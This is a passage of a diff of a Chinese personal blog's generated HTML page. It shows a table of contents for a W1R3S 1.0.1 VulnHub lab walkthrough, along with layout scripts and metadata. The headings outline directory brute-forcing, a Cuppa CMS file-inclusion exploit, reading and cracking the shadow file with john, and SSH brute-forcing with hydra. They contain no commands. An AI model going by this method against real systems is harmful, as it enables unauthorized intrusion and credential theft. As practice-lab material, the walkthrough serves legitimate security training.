href="#gobuster%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%AD%98%E5%9C%A8wordpress%E5%92%8CcuppaCMS"><span class="toc-text">gobuster目录爆破，发现存在wordpress和cuppaCMS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cuppa-CMS%E7%9A%84%E6%B8%97%E9%80%8F"><span class="toc-text">Cuppa CMS的渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E5%A4%B1%E8%B4%A5"><span class="toc-text">创建管理员失败</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#searchsploit%E5%91%BD%E4%BB%A4%E6%9F%A5%E6%89%BE%E6%AD%A4CMS%E7%9A%84%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">searchsploit命令查找此CMS的历史漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%E5%8F%91%E7%8E%B0%E6%98%AFphp%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BD%BF%E7%94%A8exploit%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B%E5%8F%AF%E4%B8%8D%E5%8F%AF%E8%A1%8C"><span class="toc-text">查看一下发现是php的文件包含漏洞，使用exploit测试一下可不可行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%89%E5%8F%8D%E5%BA%94%E4%BD%86%E6%98%AF%E6%B2%A1%E6%9C%89%E8%AF%BB%E5%87%BA%E6%9D%A5"><span class="toc-text">有反应但是没有读出来</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%BEcms%E6%BA%90%E7%A0%81%E5%81%9A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">找cms源码做代码审计</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POST%E4%BC%A0%E5%8F%82%E8%BF%9B%E8%A1%8C%E6%9F%A5%E7%9C%8B%E5%8F%91%E7%8E%B0%E5%8F%AF%E8%A1%8C"><span class="toc-text">POST传参进行查看发现可行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bshadow%E6%96%87%E4%BB%B6%E5%B9%B6%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6%E7%94%A8john%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4"><span class="toc-text">查看shadow文件并保存文件用john进行爆破</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%95%E7%9D%80%E7%94%A822%E7%AB%AF%E5%8F%A3%E7%9A%84ssh%E6%9C%8D%E5%8A%A1%E7%99%BB%E5%BD%95%EF%BC%8C%E4%BD%BF%E7%94%A8w1r3s%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95"><span class="toc-text">试着用22端口的ssh服务登录，使用w1r3s的账号密码登录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9A22%E7%AB%AF%E5%8F%A3%E7%9A%84ssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">补充：22端口的ssh暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0user-list%E5%AD%97%E5%85%B8%EF%BC%8C%E9%80%89%E6%8B%A9%E6%9C%89%E5%8F%AF%E8%83%BD%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%88hector%E6%98%AF%E4%B9%8B%E5%89%8Dftp%E6%9A%B4%E9%9C%B2%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%89"><span class="toc-text">构造user.list字典，选择有可能的用户名（hector是之前ftp暴露的信息）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hydra%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4"><span class="toc-text">使用hydra进行爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%BE%97%E5%88%B0%E5%AF%86%E7%A0%81%EF%BC%8C%E4%B9%8B%E5%90%8E%E7%9A%84%E6%93%8D%E4%BD%9C%E5%90%8C%E4%B8%8A"><span class="toc-text">爆破得到密码，之后的操作同上</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </section>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -2880,7 +2829,7 @@ ctrl+b 固定按键
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2889,15 +2838,15 @@ ctrl+b 固定按键
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="full";
-      cover_wrapper.style.display="";
-      scroll_down.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
+      scroll_down.style.display="none";
     
   
 </script>
@@ -3546,7 +3495,7 @@ ctrl+b 固定按键
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hsuoamni的个人博客","url":"http://Marmoz.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"ZAH","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://Marmoz.github.io/","sameAs":["https://github.com/volantis-x"],"description":"卧薪尝胆中~"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://Marmoz.github.io/","name":"Hsuoamni的个人博客"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hsuoamni的个人博客","url":"http://Marmoz.github.io/","keywords":null,"description":"卧薪尝胆中~","author":{"@type":"Person","name":"ZAH","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://Marmoz.github.io/","description":"卧薪尝胆中~"},"publisher":{"@type":"Organization","name":"Hsuoamni的个人博客","url":"http://Marmoz.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://Marmoz.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"卧薪尝胆中~","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"ZAH","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://Marmoz.github.io/"},"publisher":{"@type":"Organization","name":"Hsuoamni的个人博客","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hsuoamni的个人博客","url":"http://Marmoz.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"ZAH","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://Marmoz.github.io/","sameAs":["https://github.com/volantis-x"],"description":"卧薪尝胆中~"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://Marmoz.github.io/","name":"Hsuoamni的个人博客"}},{"@type":"ListItem","position":2,"item":{"@id":"http://Marmoz.github.io/categories/渗透/","name":"渗透"}},{"@type":"ListItem","position":3,"item":{"@id":"http://Marmoz.github.io/2023/12/24/W1R3S 1.0.1靶机渗透/","name":"W1R3S 1.0.1靶机渗透"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hsuoamni的个人博客","url":"http://Marmoz.github.io/","keywords":null,"description":"卧薪尝胆中~","author":{"@type":"Person","name":"ZAH","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://Marmoz.github.io/","description":"卧薪尝胆中~"},"publisher":{"@type":"Organization","name":"Hsuoamni的个人博客","url":"http://Marmoz.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://Marmoz.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"W1R3S 1.0.1靶机渗透","description":"卧薪尝胆中~","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://marmoz.github.io/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"},"author":{"@type":"Person","name":"ZAH","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://Marmoz.github.io/"},"publisher":{"@type":"Organization","name":"Hsuoamni的个人博客","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://marmoz.github.io/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","wordCount":0,"datePublished":"2023-12-24T13:16:41.000Z","dateModified":"2023-12-24T13:31:49.261Z","articleSection":"渗透","keywords":"渗透WP,vulnhub靶机练习","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
